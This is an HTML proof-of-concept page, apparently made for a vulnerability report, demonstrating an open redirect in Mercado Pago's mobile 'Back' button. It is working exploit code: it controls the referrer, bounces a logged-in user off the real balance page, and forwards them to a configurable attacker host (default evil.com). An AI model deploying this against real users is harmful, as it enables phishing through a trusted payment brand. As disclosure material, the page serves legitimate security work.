<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<!-- sends the FULL referrer cross-origin so MP receives this URL -->
<meta name="referrer" content="unsafe-url">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PoC - Mercado Pago open redirect (CWE-601)</title>
<style>
  body{font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;max-width:640px;margin:0 auto;padding:24px;line-height:1.5;color:#111}
  h1{font-size:20px} code{background:#f2f2f2;padding:2px 6px;border-radius:4px;word-break:break-all;font-size:13px}
  .ok{background:#e7f7ec;border:1px solid #2eaa5a;padding:16px;border-radius:8px}
  .go{display:inline-block;background:#009ee3;color:#fff;text-decoration:none;padding:14px 20px;border-radius:8px;font-weight:600;margin-top:12px}
  ol{padding-left:20px} small{color:#666}
</style>
</head>
<body>
<div id="app"></div>
<script>
(function(){
  // ==== CONFIG: attacker's final destination (editable). Also via URL: ...poc.html#evil=https://other.com ====
  var EVIL = "https://evil.com";
  var mHash = (location.hash.match(/evil=([^&]+)/)||[])[1];
  if (mHash) { try { EVIL = decodeURIComponent(mHash); } catch(e){} }

  var TARGET = "https://www.mercadopago.com.ar/banking/balance";
  var app = document.getElementById("app");
  function esc(s){return String(s).replace(/[&<>"']/g,function(c){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c];});}

  // Bulletproof return detection: a query-param that rides INSIDE the referrer.
  // On "go" we put ?frompoc=1 in OUR url -> that is the referrer MP sees ->
  // the "Back" button runs location.assign(referrer) -> we come back to this page WITH ?frompoc=1.
  // Fallbacks: sessionStorage + MP's document.referrer. Re-evaluated on pageshow (bfcache).
  function render(){
    var ref = document.referrer || "";
    var returned = /[?&]frompoc=1/.test(location.search)
                || sessionStorage.getItem('poc_sent') === '1'
                || /mercadopago\.com/i.test(ref);
    if (returned) {
      sessionStorage.removeItem('poc_sent');
      app.innerHTML =
        '<div class="ok"><h1>&#10003; Open redirect CONFIRMED</h1>'+
        '<p>You landed on this attacker-controlled origin from a legitimate Mercado Pago page'+
        (ref ? ':</p><code>'+esc(ref)+'</code>' : ' (the "Back" button).</p>')+
        '<p style="margin-top:12px">Forwarding to the attacker landing &rarr; <code>'+esc(EVIL)+'</code> &hellip;</p></div>';
      setTimeout(function(){ location.replace(EVIL); }, 1000);  // -> victim ends up on evil.com
    } else {
      app.innerHTML =
        '<h1>PoC &mdash; Open redirect in Mercado Pago (CWE-601)</h1>'+
        '<p>Open this in a <b>mobile</b> browser (or with mobile emulation in DevTools), '+
        '<b>logged in to Mercado Pago</b>.</p>'+
        '<ol>'+
        '<li>Tap the blue button below.</li>'+
        '<li>On the MP balance page, tap <b>&#8592; Back</b> (top-left of the navbar).</li>'+
        '<li>MP sends you back to this attacker origin, and from here you jump straight to <code>'+esc(EVIL)+'</code>.</li>'+
        '</ol>'+
        '<a class="go" href="'+TARGET+'">&#9654; Go to my Mercado Pago balance</a>'+
        '<p><small>The bug: the "Back" button of MP&#39;s mobile navbar runs '+
        '<code>location.assign(document.referrer)</code> with no host validation. '+
        'This page controls the Referer, MP redirects here, and from here to the attacker destination.</small></p>';
      var g = document.querySelector('a.go');
      if (g) g.addEventListener('click', function(){
        try { history.replaceState(null, '', location.pathname + '?frompoc=1'); } catch(e){}
        try { sessionStorage.setItem('poc_sent','1'); } catch(e){}
      });
    }
  }
  render();
  // bfcache: on return from MP, Chrome may restore the page without re-running the script;
  // pageshow re-evaluates the state so the redirect still fires.
  window.addEventListener('pageshow', function(e){ if (e.persisted) render(); });
})();
</script>
</body>
</html>
